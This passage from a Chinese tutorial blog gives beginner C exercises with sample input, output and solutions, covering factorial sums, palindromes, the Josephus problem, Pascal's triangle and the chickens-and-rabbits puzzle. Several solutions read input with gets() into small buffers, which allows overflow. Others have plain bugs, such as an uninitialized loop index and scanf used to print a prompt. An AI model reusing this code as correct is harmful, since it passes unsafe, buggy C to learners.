class="line">                      &#125;</span><br><span class="line">                  &#125; </span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="27-阶乘的和"><a href="#27-阶乘的和" class="headerlink" title="27 阶乘的和"></a>27 阶乘的和</h2><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//求1到20的阶乘的和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> sum,n;</span><br><span class="line">    sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        n=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">           n*=j;</span><br><span class="line">        <span class="comment">//循环后的n为i!</span></span><br><span class="line">        sum+=n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Sum is %ld!\n"</span>,sum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="28-递归逆序输出字符"><a href="#28-递归逆序输出字符" class="headerlink" title="28 递归逆序输出字符"></a>28 递归逆序输出字符</h2><p><strong>代码</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意，一定要在putchar()之前调用递归函数，另外注意:getchar()是从输入流中获取一个字符，所以输入的时候格式就是abcde，并非像scanf那样输入一个字符后，按回车或者Tab后再输入下一个字符。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Input chars:\n"</span>);</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        c=getchar();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Output:\n"</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        c=getchar();</span><br><span class="line">        <span class="built_in">print</span>(n<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="29-求一个整数的位数且逆序打印"><a href="#29-求一个整数的位数且逆序打印" class="headerlink" title="29 求一个整数的位数且逆序打印"></a>29 求一个整数的位数且逆序打印</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Please input an <span class="built_in">int</span>eger!</span><br><span class="line"><span class="number">789456</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">654987</span></span><br><span class="line">It contains <span class="number">6</span> digits!</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digits</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input an integer!\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"It contains %d digits!\n"</span>,digits(i));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">digits</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> d=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>, n%<span class="number">10</span>);</span><br><span class="line">        n /= <span class="number">10</span>;</span><br><span class="line">        d++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="30-判断回文数"><a href="#30-判断回文数" class="headerlink" title="30 判断回文数"></a>30 判断回文数</h2><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12121</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">12121 </span>是回文数</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//思路：反着排一遍，如果和原数相同则为回文数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">huiwenshu</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"input a interger:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">    <span class="keyword">if</span>(huiwenshu(num))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d 是回文数"</span>, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d 不是回文数"</span>, num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">huiwenshu</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s,y=<span class="number">0</span>;</span><br><span class="line">    s=num;</span><br><span class="line">    <span class="keyword">while</span>(s&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        y=y*<span class="number">10</span>+s%<span class="number">10</span>;</span><br><span class="line">        s /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(y==num)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="31-判断字符串是否为回文"><a href="#31-判断字符串是否为回文" class="headerlink" title="31 判断字符串是否为回文"></a>31 判断字符串是否为回文</h2><p><strong>样例输入</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">abcdcba</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是回文</span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span>  <span class="title">huiwen</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"input a string:"</span>);</span><br><span class="line"><span class="comment">//    scanf("%s",&amp;str);</span></span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="keyword">if</span>(huiwen(str, <span class="built_in">strlen</span>(str)))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"是回文"</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不是回文"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span>  <span class="title">huiwen</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i]!=str[len-i<span class="number">-1</span>])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="32-顺序队列中插入新元素"><a href="#32-顺序队列中插入新元素" class="headerlink" title="32 顺序队列中插入新元素"></a>32 顺序队列中插入新元素</h2><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">11</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">18</span>,<span class="number">24</span>,<span class="number">32</span>,<span class="number">45</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i,num,pos=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num);</span><br><span class="line">    <span class="keyword">if</span>(num&gt;=a[<span class="number">9</span>])</span><br><span class="line">        a[<span class="number">10</span>]=num;</span><br><span class="line">    <span class="keyword">while</span>(a[i]&lt;num)     <span class="comment">//找到第一个不比num小的元素的位置</span></span><br><span class="line">    &#123;</span><br><span class="line">        i++;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">10</span>;i&gt;pos;i--) <span class="comment">//将该元素及之后所有元素右移一位</span></span><br><span class="line">        a[i]=a[i<span class="number">-1</span>];</span><br><span class="line">    a[pos]=num;         <span class="comment">//给新元素安排位置</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">11</span>;i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%4d"</span>,a[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="33-杨辉三角形"><a href="#33-杨辉三角形" class="headerlink" title="33 杨辉三角形"></a>33 杨辉三角形</h2><p><img src="/2020/01/26/C_C++_02/20200227152517.png" alt>)<img src="/2020/01/26/C_C++_02/20200227152548.png" alt></p><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> N 10</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j,a[N][N];</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">    a[i][i]=<span class="number">1</span>;</span><br><span class="line">    a[i][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i<span class="number">-1</span>;j++)&#123;</span><br><span class="line">        a[i][j]=a[i<span class="number">-1</span>][j]+a[i<span class="number">-1</span>][j<span class="number">-1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=i;j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%6d"</span>, a[i][j]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="34-约瑟夫环问题"><a href="#34-约瑟夫环问题" class="headerlink" title="34 约瑟夫环问题"></a>34 约瑟夫环问题</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;一堆猴子都有编号，编号是1，2，3 …m，这群猴子（m个）按照1-m的顺序围坐一圈，从第1开始数，每数到第N个，该猴子就要离开此圈，这样依次下来，直到圈中只剩下最后一只猴子，则该猴子为大王。</p><p><strong>样例输入</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请输入猴子的总数：<span class="number">6</span></span><br><span class="line">请输入循环单位：<span class="number">5</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">它出列了：<span class="number">5</span></span><br><span class="line">它出列了：<span class="number">4</span></span><br><span class="line">它出列了：<span class="number">6</span></span><br><span class="line">它出列了：<span class="number">2</span></span><br><span class="line">它出列了：<span class="number">3</span></span><br><span class="line">最终大王是他：<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SIZE 50</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Monkey[MAX_SIZE];</span><br><span class="line">    <span class="keyword">int</span> total_num,num,n,i,count,pos;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入猴子的总数："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;total_num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入循环单位："</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;total_num;i++)&#123;</span><br><span class="line">        Monkey[i]=i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    count=<span class="number">0</span>;</span><br><span class="line">    pos=<span class="number">0</span>;</span><br><span class="line">    num=total_num;</span><br><span class="line">    <span class="keyword">while</span>(num!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(Monkey[pos]!=<span class="number">0</span>)&#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count==n)&#123;</span><br><span class="line">            Monkey[pos]=<span class="number">0</span>;</span><br><span class="line">            num--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"它出列了: %d\n"</span>,pos+<span class="number">1</span>);</span><br><span class="line">            count=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pos++;</span><br><span class="line">        <span class="keyword">if</span>(pos==total_num)&#123;</span><br><span class="line">            pos=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pos=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(Monkey[pos]==<span class="number">0</span>)&#123;</span><br><span class="line">        pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"最终大王是他：%d"</span>, pos+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="35-八进制转十进制"><a href="#35-八进制转十进制" class="headerlink" title="35 八进制转十进制"></a>35 八进制转十进制</h2><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">char</span> *p,s[<span class="number">6</span>];<span class="keyword">int</span> n;</span><br><span class="line">p=s;</span><br><span class="line">gets(p);</span><br><span class="line">n=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(*(p)!=<span class="string">'\0'</span>)</span><br><span class="line">&#123;n=n*<span class="number">8</span>+*p-<span class="string">'0'</span>;</span><br><span class="line">p++;&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="36-鸡兔同笼"><a href="#36-鸡兔同笼" class="headerlink" title="36 鸡兔同笼"></a>36 鸡兔同笼</h2><p><strong>题目描述</strong></p><p>&ensp;&emsp;已知鸡和兔的总数量为<code>n</code>，总腿数为<code>m</code>，输入<code>n</code>和<code>m</code>，依次输出鸡的数目和兔的数目。如果无解则输出<code>No answer</code>。</p><p><strong>样例输入</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">14 </span><span class="number">32</span></span><br></pre></td></tr></table></figure><p><strong>样例输出</strong></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">12 </span><span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///巧解，先算出鸡的数量再算兔子的数量，根据均&gt;=0判断是否有解</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a,b,n, m;</span><br><span class="line">  <span class="comment">// a鸡的数量</span></span><br><span class="line">  <span class="comment">// b兔的数量</span></span><br><span class="line">  <span class="comment">// n鸡兔总数</span></span><br><span class="line">  <span class="comment">// m总脚数</span></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n,&amp;m);</span><br><span class="line">  a = (<span class="number">4</span> * n - m) / <span class="number">2</span>;<span class="comment">//算出鸡的数量</span></span><br><span class="line">  b = n - a;<span class="comment">//算出兔的数量</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (a &lt;= <span class="number">0</span> || b &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">//结果小于等于0，答案不成立，无解</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No answer"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">//结果大于0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d"</span>, a, b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="37-三天打鱼两天晒网"><a href="#37-三天打鱼两天晒网" class="headerlink" title="37 三天打鱼两天晒网"></a>37 三天打鱼两天晒网</h2><p><strong>题目描述</strong></p><p>&emsp;&emsp;中国有句俗语叫“三天打鱼两天晒网”。某人从2010年1月1日起开始“三天打鱼两天晒网”，问这个人在以后的以后的某一天中是打鱼还是晒网。</p><p><strong>代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*中国有句俗语“三天打鱼两天晒网”，</span></span><br><span class="line"><span class="comment">有个人从2010年1月1日起开始“三天打鱼，两天晒网”</span></span><br><span class="line"><span 